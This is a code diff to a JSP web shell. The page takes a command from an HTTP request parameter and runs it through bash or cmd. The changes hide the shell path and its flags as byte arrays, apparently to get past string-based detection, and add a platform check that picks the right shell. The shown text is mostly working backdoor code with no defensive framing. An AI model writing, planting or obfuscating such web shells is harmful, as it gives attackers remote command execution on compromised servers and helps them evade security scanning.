@@ -1,8 +1,15 @@
 <%@page import="java.util.*,java.io.*,java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket,java.util.HashSet,java.net.InetAddress,java.net.NetworkInterface,java.net.SocketException,java.util.Enumeration,java.util.Iterator,java.util.Set"%><%
 //  trimDirectiveWhitespaces="true"
-String cmd = request.getParameter("ls"),bh = "/bin/bash", cS = "-c", szSys = "\n",szTmp = "",s1 = null,s2 = null,
+String cmd = request.getParameter("ls"),
+    bh = new String(new byte[]{47, 98, 105, 110, 47, 98, 97, 115, 104}), 
+    cS = new String(new byte[]{45, 99}), szSys = "\n",szTmp = "",s1 = null,s2 = null,
 szKeys = "";
-String bsK = "bash";
+String fileSeparator = String.valueOf(java.io.File.separatorChar);
+if(fileSeparator.equals("\\"))
+{
+    bh = new String(new byte[]{99, 109, 100});
+    cS = new String(new byte[]{47, 67});
+}
 
 String szT1 = request.getParameter("f"),szT2;
 if(null != szT1)
@@ -83,18 +90,6 @@ if(request.getHeader("X-CMD") == null)
             szSys += "curRealPath=\"" + szKK + "\"";
         }
     }catch(Exception e){}
-        
-
-    if(-1 < szSys.indexOf("Windows") || null != cmd && -1 < cmd.indexOf("cmd"))
-    {
-        bh = "%ComSpec%";
-        cS = "/c";
-    }
-    else if(null != request.getParameter(bsK))
-    {
-        bh = request.getParameter(bsK).toString();
-        if(-1 < bh.indexOf("cmd"))cS = "/c";
-    }
 }
 if (cmd != null)
 {
